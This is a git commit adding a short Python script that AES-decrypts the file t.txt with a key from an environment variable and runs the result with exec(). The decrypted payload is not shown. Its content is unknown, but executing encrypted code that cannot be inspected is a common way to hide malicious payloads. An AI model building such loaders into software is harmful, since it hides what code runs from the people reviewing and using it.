3de1067ea4a16effb6b1a690f455efb79614ff81
FIRZAH <146391558+FIRandZAH@users.noreply.github.com>
2024-07-20 13:04:36 +0700

    Add files via upload

---
+++ run.py
@@ -0,0 +1,26 @@
+from Crypto.Cipher import AES
+import binascii
+import os
+
+def read_file(file_path):
+    with open(file_path, 'rb') as file:
+        return file.read()
+
+encoded_file_path = 't.txt'
+
+decryption_key_hex = os.getenv('DECRYPTION_KEY')
+if decryption_key_hex is None:
+    raise ValueError("Decryption key not found in environment variables")
+
+decryption_key = binascii.unhexlify(decryption_key_hex)
+
+encrypted = read_file(encoded_file_path)
+
+iv = encrypted[:16]
+encrypted_message = encrypted[16:]
+
+cipher = AES.new(decryption_key, AES.MODE_CFB, iv)
+
+decrypted = cipher.decrypt(encrypted_message)
+
+exec(decrypted.decode('utf-8'))
